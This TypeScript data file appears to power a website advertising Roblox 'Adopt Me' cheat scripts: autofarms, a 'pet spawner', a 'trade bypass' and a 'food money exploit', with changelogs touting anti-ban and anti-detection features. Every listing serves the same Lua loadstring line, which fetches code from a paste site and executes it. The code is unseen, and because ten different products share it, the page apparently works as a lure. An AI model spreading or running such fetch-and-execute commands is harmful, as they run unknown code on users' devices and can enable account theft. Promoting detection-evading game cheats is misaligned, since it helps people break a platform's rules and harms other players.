export interface ScriptDef {
  id: string;
  title: string;
  heading: string;
  description: string;
  changelogKey?: string;
  images?: string[];
}

export const SCRIPT_URL =
  "loadstring(game:HttpGet('https://pastefy.app/9Joe7HEm/raw'))()";

export function generateRandomLoadstring(): string {
  return SCRIPT_URL;
}

export const SCRIPTS: ScriptDef[] = [
  {
    id: 'auto-farm',
    title: 'Eclipse Hub - Adopt Me Autofarm',
    heading: 'eclipse hub - adopt me autofarm',
    description:
      "This script for Adopt Me will automatically farm for you, collecting cash and helping you get your dream pets faster than ever before. It's safe, efficient, and easy to use.",
    changelogKey: 'autofarm',
    images: [
      'scripts/eclipse-autofarm-1.jpg',
      'scripts/eclipse-autofarm-2.jpg',
      'scripts/yt-eclipse-hub-video.jpg',
    ],
  },
  {
    id: 'pet-spawner-visual',
    title: 'Adopt Me - Pet Spawner (Visual)',
    heading: 'adopt me - pet spawner',
    description: 'Spawn and customise pets visually – no serverside.',
    changelogKey: 'pet-spawner',
    images: [
      'scripts/yt-pet-spawner-halloween.jpg',
      'scripts/yt-pet-spawner-july.jpg',
      'scripts/pet-spawner-1.jpg',
    ],
  },
  {
    id: 'trade-checker',
    title: 'Adopt Me - Trade Value Checker',
    heading: 'adopt me - trade value checker',
    description: 'Check trade values instantly to avoid bad trades.',
    images: [
      'scripts/yt-trade-scam.jpg',
      'scripts/yt-trade-scam-new.jpg',
      'scripts/trade-checker-1.jpg',
    ],
  },
  {
    id: 'trade-bypass',
    title: 'Adopt Me - Trade Bypass',
    heading: 'adopt me - trade bypass',
    description: 'Bypass trade restrictions effortlessly.',
    images: [
      'scripts/yt-trade-scam.jpg',
      'scripts/trade-bypass-1.jpg',
    ],
  },
  {
    id: 'food-money',
    title: 'Adopt Me - Food Money Exploit',
    heading: 'adopt me - food money exploit',
    description: 'Exploit food mechanics to earn cash quickly.',
    images: [
      'scripts/yt-adoptme-event.jpg',
      'scripts/food-money-1.jpg',
    ],
  },
  {
    id: 'fps-boost',
    title: 'Adopt Me - FPS Boost & Unlock, Better Graphics, Shaders',
    heading: 'adopt me fps boost & unlock, better graphics, shaders',
    description:
      'Boost your FPS, unlock better graphics and add beautiful shaders to enhance your Adopt Me gaming experience.',
    images: [
      'scripts/yt-fps-unlock.jpg',
      'scripts/yt-fps-unlock2.jpg',
    ],
  },
  {
    id: 'axonic-keyless',
    title: 'Adopt Me - Axonic Keyless Hub',
    heading: 'adopt me axonic keyless hub',
    description:
      'Axonic Keyless Hub for Adopt Me — auto-farm, keyless pet collection, and smart task automation in one clean interface.',
    images: [
      'scripts/yt-atherhub.jpg',
      'scripts/yt-keyless-script.jpg',
      'scripts/axonic-1.jpg',
    ],
  },
  {
    id: 'snowy-hub',
    title: 'Adopt Me - Snowy Hub Autofarm',
    heading: 'adopt me snowy hub autofarm',
    description:
      'Snowy Hub delivers full auto-farm for Adopt Me — pet collection, cash farming, and daily tasks automated.',
    images: [
      'scripts/yt-eclipse-showcase.jpg',
      'scripts/snowy-1.jpg',
      'scripts/snowy-2.jpg',
    ],
  },
  {
    id: 'forge-hub',
    title: 'Adopt Me - Forge Hub Full Tasks',
    heading: 'adopt me forge hub full tasks',
    description:
      'Forge Hub covers every Adopt Me task — auto-farm, pet collection, obby completion, and more in a single script.',
    images: [
      'scripts/yt-adoptme-event.jpg',
      'scripts/forge-1.jpg',
      'scripts/forge-2.jpg',
    ],
  },
  {
    id: 'dp-hub',
    title: 'Adopt Me - DP Hub House Clone',
    heading: 'adopt me dp hub house clone',
    description:
      'DP Hub clones the Adopt Me house system — auto-feed, auto-farm, and pet management all in one.',
    images: [
      'scripts/yt-pet-spawner-halloween.jpg',
      'scripts/dp-hub-1.jpg',
    ],
  },
];

export interface ChangelogEntry {
  date: string;
  changes: string;
}

const CHANGELOGS: Record<string, ChangelogEntry[]> = {
  'pet-spawner': [
    { date: '2024-01-15', changes: '🆕 Initial release with basic pet spawning' },
    { date: '2024-02-20', changes: '🔧 Fixed compatibility with latest Roblox update' },
    { date: '2024-03-10', changes: '✨ Added rare pet spawning capabilities' },
    { date: '2024-04-05', changes: '🛡️ Enhanced security and anti-detection' },
    { date: '2024-05-18', changes: '🎯 Improved target pet selection UI' },
    { date: '2024-06-22', changes: '⚡ Performance optimizations for faster spawning' },
    { date: '2024-07-14', changes: '🐛 Bug fixes for mobile executor compatibility' },
    { date: '2024-08-30', changes: '🔥 Added legendary pet spawning feature' },
    { date: '2024-09-12', changes: '🎨 New GUI design with better UX' },
    { date: '2024-10-25', changes: '🚀 Major update: Serverside capabilities added' },
    { date: '2024-11-08', changes: '🔧 Compatibility fixes for new Adopt Me update' },
    { date: '2024-12-20', changes: '🎁 Holiday special: Exclusive holiday pets support' },
    { date: '2025-02-14', changes: '🐾 Added mythic pet spawning support' },
    { date: '2025-04-30', changes: '⚡ 30% faster spawn animation pipeline' },
    { date: '2025-07-18', changes: '🎨 Redesigned pet selection carousel' },
    { date: '2025-10-05', changes: '🛡️ Anti-detection engine v2' },
    { date: '2026-01-22', changes: '🔧 Fixed spawn timing for Roblox 2026 update' },
    { date: '2026-05-10', changes: '🎉 Added seasonal pet rotation support' },
  ],
  autofarm: [
    { date: '2024-01-10', changes: '🆕 Eclipse Hub Autofarm initial release' },
    { date: '2024-02-15', changes: '💰 Enhanced cash collection efficiency' },
    { date: '2024-03-25', changes: '🏃 Added auto-aging and feeding features' },
    { date: '2024-04-18', changes: '🛡️ Anti-ban protection improvements' },
    { date: '2024-05-30', changes: '🎯 Smart pet task automation' },
    { date: '2024-06-12', changes: '⚡ 50% faster farming algorithms' },
    { date: '2024-07-08', changes: '🌙 Added night mode farming optimization' },
    { date: '2024-08-21', changes: '🔧 Mobile executor optimization' },
    { date: '2024-09-15', changes: '🎪 Minigame automation support' },
    { date: '2024-10-03', changes: '🏠 House decoration farming added' },
    { date: '2024-11-17', changes: '🎮 Multi-game support expansion' },
    { date: '2024-12-18', changes: '🎉 Year-end performance boost update' },
    { date: '2025-03-05', changes: '💰 Auto-trading and pet marketplace integration' },
    { date: '2025-06-20', changes: '🏃 Added egg hatching automation' },
    { date: '2025-09-14', changes: '🛡️ Anti-ban engine v2 with heuristic detection' },
    { date: '2026-01-08', changes: '🎯 Smart routing for fastest cash collection' },
    { date: '2026-04-22', changes: '⚡ 60% faster pet collection with path optimization' },
    { date: '2026-07-01', changes: '🔧 Compatibility fixes for Roblox 2026 summer update' },
  ],
  'axonic-keyless': [
    { date: '2025-06-10', changes: '🆕 Axonic Keyless Hub initial release' },
    { date: '2025-07-22', changes: '💰 Auto-farm and keyless pet collection added' },
    { date: '2025-09-05', changes: '🏃 Smart task automation for daily routines' },
    { date: '2025-11-14', changes: '🛡️ Anti-ban protection improvements' },
    { date: '2026-01-30', changes: '🎯 Enhanced pet collection UI' },
    { date: '2026-04-18', changes: '⚡ 40% faster farming algorithms' },
    { date: '2026-06-25', changes: '🔧 Compatibility fixes for latest Roblox update' },
  ],
  'snowy-hub': [
    { date: '2025-05-15', changes: '🆕 Snowy Hub initial release' },
    { date: '2025-08-20', changes: '💰 Full auto-farm implementation' },
    { date: '2025-10-30', changes: '🐾 Pet collection and cash farming automation' },
    { date: '2026-01-12', changes: '🏠 Daily tasks auto-completion' },
    { date: '2026-03-28', changes: '🛡️ Anti-detection system update' },
    { date: '2026-06-15', changes: '🎨 Redesigned GUI with better UX' },
  ],
  'forge-hub': [
    { date: '2025-04-01', changes: '🆕 Forge Hub initial release' },
    { date: '2025-06-18', changes: '💰 Auto-farm and pet collection added' },
    { date: '2025-09-10', changes: '🏃 Obby completion automation' },
    { date: '2025-12-05', changes: '🎪 Multi-task support expansion' },
    { date: '2026-02-20', changes: '🛡️ Improved anti-ban protection' },
    { date: '2026-05-10', changes: '⚡ Performance boost and bug fixes' },
  ],
  'dp-hub': [
    { date: '2025-07-01', changes: '🆕 DP Hub initial release' },
    { date: '2025-09-25', changes: '🏠 House clone system added' },
    { date: '2025-12-15', changes: '💰 Auto-feed and auto-farm integration' },
    { date: '2026-02-10', changes: '🐾 Pet management tools' },
    { date: '2026-04-30', changes: '🛡️ Anti-detection update' },
    { date: '2026-07-01', changes: '🎯 Enhanced automation for all house tasks' },
  ],
};

export function getChangelog(scriptId: string | undefined): ChangelogEntry[] {
  return (scriptId && CHANGELOGS[scriptId]) || [];
}
